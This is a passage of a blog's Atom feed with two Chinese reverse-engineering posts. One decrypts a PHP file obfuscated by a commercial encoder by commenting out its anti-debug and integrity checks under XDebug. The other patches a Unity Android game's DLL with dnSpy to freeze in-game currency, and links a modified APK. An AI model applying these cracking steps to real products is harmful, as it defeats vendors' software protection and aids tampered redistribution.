      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="Ueditor" scheme="https://fuping.site/tags/Ueditor/"/>
    
      <category term="SSRF" scheme="https://fuping.site/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>某PHP加密文件解密过程初探</title>
    <link href="https://fuping.site/2018/02/08/Free-PhpJiaMi-Decrypt/"/>
    <id>https://fuping.site/2018/02/08/Free-PhpJiaMi-Decrypt/</id>
    <published>2018-02-08T10:08:24.000Z</published>
    <updated>2018-02-09T03:08:36.771Z</updated>
    
    <content type="html"><![CDATA[<p>最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>采用的IDE为VSCode，需要安装PHP DEBUG插件和XDebug 插件。<br>安装php debug插件比较简单，直接快捷键ctrl + shift + x  或者 “查看-扩展” 打开扩展面板。输入”php debug”搜索。<br><img src="01.jpg" alt="01"><br>然后安装即可。<br>其次是安装XDebug。安装可以参考:<a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">https://xdebug.org/docs/install</a> 。首先查看一下PHP版本。我这里用的是5.5.30。<br><img src="02.jpg" alt="02"><br>打开php.ini，找到XDebug标签（我这里ext目录已经有xdebug.dll了，直接启用扩展即可）。如果没有XDebug标签，自己添加即可。<br><img src="03.jpg" alt="03"><br>打开扩展。<br><img src="04.png" alt="04"><br>注意设置<code>xdebug.remote_autostart = 1</code>。这样设置好debug和断点后，浏览器运行即可自动命中断点。<br>打开VSCode，设置编辑php的可执行文件路径。<br><img src="05.jpg" alt="05"><br>这样调试所需的环境就配置好了。使用时打开左侧的调试按钮，然后添加配置语言选择PHP。<br><img src="06.jpg" alt="06"><br>给代码添加断点后，点击开始调试按钮。浏览器访问时会在断点处停下，就可以进行调试了。<br><img src="07.jpg" alt="07"><br>乱码的话可以通过更改文件编码来设置。快捷键<code>Ctrl + Shift + P</code>，选择更改文件编码，找到合适的编码。<br><img src="08.jpg" alt="08"><br>php最大执行时间是30秒，超过30秒会自动终止，因此调试的时候要修改一下时间，在php.ini 文件中修改最大运行时间为5分钟。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_execution_time = <span class="number">300</span></span><br></pre></td></tr></table></figure><h1 id="0x02-解密"><a href="#0x02-解密" class="headerlink" title="0x02 解密"></a>0x02 解密</h1><h4 id="1-独立加密"><a href="#1-独立加密" class="headerlink" title="1.独立加密"></a>1.独立加密</h4><p>上面环境已经准备好了，下面就开始正式工作了。首先需要获得一个加密的文件。我直接利用上面的文件去某加密网站进行加密。<br><img src="09.jpg" alt="09"><br>加密后大概是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span>error_reporting(<span class="number">0</span>);ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);<span class="keyword">if</span>(!defined(<span class="string">'kcapwkef'</span>))&#123;define(<span class="string">'kcapwkef'</span>,<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(!function_exists(<span class="string">"�㒁�؁��"</span>))&#123;<span class="function"><span class="keyword">function</span> �����ٹ�<span class="params">($������)</span></span>&#123;<span class="keyword">global</span>$Đ���Л�,$�……</span><br></pre></td></tr></table></figure><p>使用PHP-Parser对代码进行格式化，便于调试。<br>执行命令<code>composer require nikic/php-parser</code><br><img src="10.jpg" alt="10"><br>利用作者的format.php将代码格式化。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'9014/t.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'9014/t2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure><p>然后执行命令<code>php format.php</code>，会生成格式化的t2.php。<br><img src="11.jpg" alt="11"><br>选择一个不是多字节的字符集，这样在调试的时候可以显示出变量代表的内容。这里用的是<code>Western (ISO 8859-1)</code>。<br>我的思路是在程序开始下断点，然后一直F10（单步跳过），当程序中断时，在此处下断点，F11进入（单步调试）。找到中断的原因，解决后再重复上述操作。<br>F10运行时发现在102行退出了程序。<br><img src="12.jpg" alt="12"><br>然后在第102行下断点，F11单步运行。进入后继续F10运行。<br><img src="13.jpg" alt="13"><br>当运行到第23行时，程序退出。前面两个变量是多字节字符，所以看不到内容，后面的是die。看代码可以看到前两个分别在第13行和第15行出现。再次运行，当运行到第13行时F11进入。调用了第52行的函数（由于函数名是乱码，我们给起个名字<code>decode_func</code>）。<br><img src="14.jpg" alt="14"><br>直接在73行返回值处下断点，然后F5运行，看返回的结果。<br><img src="15.jpg" alt="15"><br>同理，查看第15行返回的结果。<br><img src="16.jpg" alt="16"><br>那么第23行处的代码为：<br><code>php_sapi_name() == &#39;cli&#39; ? die() : &#39;&#39;;</code><br><img src="17.jpg" alt="17"><br>由于这里是在命令行下执行的，所以会退出。找到了问题所在，直接注释掉此处即可。然后重新执行。运行至第26行时再次退出。<br><img src="18.jpg" alt="18"><br>此处代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由控制台发现<br><code>!isset($_SERVER[&#39;HTTP_HOST&#39;]) &amp;&amp; !isset($_SERVER[&#39;SERVER_ADDR&#39;]) &amp;&amp; !isset($_SERVER[&#39;REMOTE_ADDR&#39;])</code><br>执行结果为true，所以会退出。还是屏蔽该if判断即可。重新执行。<br><img src="19.jpg" alt="19"><br>第28-32行对应代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$t = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $t &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处判断执行时间大于100毫秒就退出，当然还是注释即可。<br>运行至第34行，程序退出。F11进入。调用了第52行的<code>decode_func</code>函数。<br><img src="20.jpg" alt="20"><br>直接查看返回值。<br><img src="21.jpg" alt="21"><br>第34行对应的代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure><p><code>decode_func</code>是第52行的函数，$f是当前的文件，<code>$undefined1</code>和 <code>$undefined2</code>都不存在。查看<code>strpos</code>中两个参数。<br><img src="22.jpg" alt="22"><br>那么 <code>! strops(string,find)</code> 的结果为true。则执行<code>$undefined1()</code>，这个方法不存在，就会Error并退出程序。如下图所示。<br><img src="23.jpg" alt="23"><br>解决方法是注释第34行或者将”!”去掉。去掉”!”会执行 <code>$undefined2</code>，只会警告而不会退出。这里采用”暴力”的手段，直接注释掉了。<br>然后重新执行程序，F5运行到断点后，F11进入，然后F10运行。<br>运行到38行时，查看返回的内容，是源文件的内容。这个内容就是我们需要的。<br><img src="24.jpg" alt="24"><br>可以通过file_put_contents将文件保存即可。<br><img src="25.jpg" alt="25"><br>查看输出的结果。<br><img src="26.jpg" alt="26"><br>也可以在第102行用file_put_contents将文件保存。<br>使用原作者的decrypt.php也可解密。执行命令：<code>php decrypt.php 9014\t.php</code>，会生成解密后的文件”t.php.decrypted.php”。<br><img src="27.jpg" alt="27"></p><h4 id="2-LIB库加密"><a href="#2-LIB库加密" class="headerlink" title="2._LIB库加密"></a>2._LIB库加密</h4><p>调试过程和独立加密类似。<br><img src="28.jpg" alt="28"><br>还用之前的t.php作为源文件，加密后生成两个文件，一个是t.php，一个是_lib.php。<br><img src="29.jpg" alt="29"><br>这里的t.php就比较简单了，直接调用了_lib.php文件。主要研究的还是_lib.php文件。老规矩，还是先格式化。新建文件夹viptest，将t.php和格式化后的_lib.php复制进去。然后对格式化后的_lib.php进行编码转换。下断点开始进行调试。这里断点为106行。<br>然后浏览器访问，就会在断点处停止。F11进入后F10单步跳过。<br><img src="30.jpg" alt="30"><br>运行至第43行时退出，直接屏蔽这几行即可。然后重新访问。<br><img src="31.jpg" alt="31"><br>运行至第46行，校验数据完整性，由于_lib.php是格式化而来的代码，所以此处校验不通过，就会调用不存在的方法，然后产生错误而退出。<br>执行的代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f = file_get_contents(<span class="string">'_lib.php'</span>);</span><br><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure><p><img src="32.jpg" alt="32"><br>注释该校验即可。<br>继续执行，查看返回即可看到加密前的代码了。<br><img src="33.jpg" alt="33"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>类似此类的加密文件在进行调试时需要先将代码格式化，选择不是多字节的字符集，然后进行调试。我的测试流程是首先在开始下断点，然后F10执行，当遇到程序退出时，在此处下断点，再次运行，运行到此处F11进入。进入后F10执行，找到问题所在解决后重复上述流程。</p><p>这里都是以免费加密为例，关于VIP加密的可以参考作者的文章<a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">【原创】某PHP加密文件调试解密过程</a> ，还有他的虚拟机加密解密的文章也值得学习。</p><p><a href="https://fuping.site/files/ctf.7z">所用的代码</a></p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-693641-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程之美" scheme="https://fuping.site/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="PHP解密" scheme="https://fuping.site/tags/PHP%E8%A7%A3%E5%AF%86/"/>
    
      <category term="PHP调试" scheme="https://fuping.site/tags/PHP%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Unity3d类安卓游戏逆向分析初探</title>
    <link href="https://fuping.site/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/"/>
    <id>https://fuping.site/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/</id>
    <published>2018-01-31T12:40:26.000Z</published>
    <updated>2018-01-31T14:23:24.529Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。<br>这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。</p><a id="more"></a><h3 id="0x02-修改数据"><a href="#0x02-修改数据" class="headerlink" title="0x02 修改数据"></a>0x02 修改数据</h3><p>下载app后重命名为zip文件，发现存在assets\bin\Data\Managed目录，那么该游戏应该为Unity游戏。<br><img src="1.jpg" alt="查看apk文件"><br>那么需要分析的文件就是就是Assembly-CSharp.dll。</p><p>首先修改一下抽奖券的数量。安装游戏后，找到抽奖的地方。抽奖的时候提示券不足。<br><img src="2.jpg" alt="抽奖券不足"></p><p>使用dnSpy打开Assembly-CSharp.dll文件，然后搜索字符串”足”，可以发现有两个，打开后发现是第一个。<br><img src="3.jpg" alt="搜索字符串"><br>由此可以猜测TicketStock代表抽奖券库存。<br><img src="4.jpg" alt="抽奖券库存"><br>ticket表示抽奖券数量。<br><img src="5.jpg" alt="抽奖券数量"><br>当页查找ticket，发现有一个initialize方法进行初始化。我们将此处的数量改为1000.<br><img src="6.jpg" alt="初始化方法"><br>快捷键Ctrl+E编辑IL指令。找到ticket变量后，将ldc.i4.0改为ldc.i4，然后将数值改为1000.<br><img src="7.jpg" alt="编辑IL指令"><br>确定后，发现ticket数值已经改变。<br><img src="8.jpg" alt="抽奖券修改"><br>重新打包APP后，进行安装。<br><img src="9.png" alt="抽奖券改变"><br>打开抽奖界面发现数量已经改变为1000。<br><img src="10.png" alt="抽奖后抽奖券变动"><br>这样虽然达到了修改抽奖券的效果，但数量再大，总会被抽完的。那就换种方法，比如说抽奖的时候增加奖券，或者奖券一直不变。这里采用奖券数量固定的方法，使其不会变动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SuperGameMaster.TicketStock() &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ConfilmPanel confilm = <span class="keyword">this</span>.ConfilmUI.GetComponent&lt;ConfilmPanel&gt;();</span><br><span class="line">    confilm.OpenPanel(<span class="string">"ふくびき券が足りません"</span>);</span><br><span class="line">    confilm.ResetOnClick_Screen();</span><br><span class="line">    confilm.SetOnClick_Screen(delegate</span><br><span class="line">    &#123;</span><br><span class="line">        confilm.ClosePanel();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>已知抽奖的时候奖券是从SuperGameMaster.TicketStock()获取的，找到该方法。令其返回值为固定的数值。<br><img src="11.jpg" alt="TicketStock方法"><br>右键编辑IL指令。<br><img src="12.jpg" alt="编辑IL指令"><br>将其值修改为9000.<br><img src="13.jpg" alt="修改返回值"><br>然后保存后打包并重新安装。<br><img src="14.png" alt="打包安装"><br>此时无论抽多少次，奖券都不再变化。<br>另一个就是修改三叶草的数量了。三叶草是该游戏中流行的货币，买东西都是需要该物品。同理找到CloverPointStock()方法。<br><img src="15.jpg" alt="修改三叶草"><br>将其返回值修改为8888。之后就可以随便买买买了，三叶草的数量也不会发生变化了。<br><img src="16.png" alt="三叶草数量"></p><h3 id="0x03-汉化"><a href="#0x03-汉化" class="headerlink" title="0x03 汉化"></a>0x03 汉化</h3><p>然后就是进行汉化了。汉化的方法和上面的类似。首先搜索需要修改的文字。例如给小青蛙起名字的时候。直接进行字符串搜索。<br><img src="17.jpg" alt="查找文字"><br>然后修改为对应的中文就行了。<br><img src="18.jpg" alt="日文修改为对应的中文"><br>进入游戏查看。<br><img src="19.png" alt="文字替换成功"><br>修改其他处的文字也是这样操作即可。当然这种修改方法比较慢，还有另外一种，直接将他人汉化过的dll文件复制进来，可以快速达到汉化的目的，也没有广告的烦恼了。</p><h3 id="0x04-其他修改"><a href="#0x04-其他修改" class="headerlink" title="0x04 其他修改"></a>0x04 其他修改</h3><p>按照以上方法修改的时候，每次都需要重新玩，还要经过”新手教学阶段”。我们可以使用安卓的备份功能，进行备份。然后重新安装app后直接恢复备份即可。<br>首先需要在AndroidManifest.xml文件中增加<code>android:allowBackup=&quot;true&quot;</code>。<br><img src="20.jpg" alt="修改AndroidManifest.xml文件"><br>这样就可以使用备份命令了。<br>命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb backup -nosystem -noshared -noapk -f jp.co.hit_point.tabikaeru.ab jp.co.hit_point.tabikaeru</span><br><span class="line">//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -noapk表示不备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName</span><br></pre></td></tr></table></figure><p><img src="23.jpg" alt="备份和恢复"><br>手机备份操作界面：<br><img src="21.png" alt="备份数据"></p><p>恢复命令比较简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore jp.co.hit_point.tabikaeru.ab</span><br></pre></td></tr></table></figure><p>手机备份还原界面<br><img src="22.png" alt="恢复数据"></p><p>然后就可以进行进度的保存和恢复了。就省去了每次都要进行”新手教学”的烦恼。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包签名后即可。<br><a href="https://fuping.site/files/jp.co.hit_point.tabikaeru.apk">原版APK</a><br><a href="https://fuping.site/files/tabikaeru.apk">修改后的APK</a>（修改了抽奖券、三叶草和部分汉化）</p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d" target="_blank" rel="noopener">https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d</a><br>[2] <a href="https://www.52pojie.cn/thread-647612-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-647612-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。&lt;br&gt;这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。&lt;/p&gt;
    
    </summary>
    
    
      <category term="移动安全" scheme="https://fuping.site/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Unity3d" scheme="https://fuping.site/tags/Unity3d/"/>
    
      <category term="青蛙旅行" scheme="https://fuping.site/tags/%E9%9D%92%E8%9B%99%E6%97%85%E8%A1%8C/"/>
    
      <category term="逆向分析" scheme="https://fuping.site/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
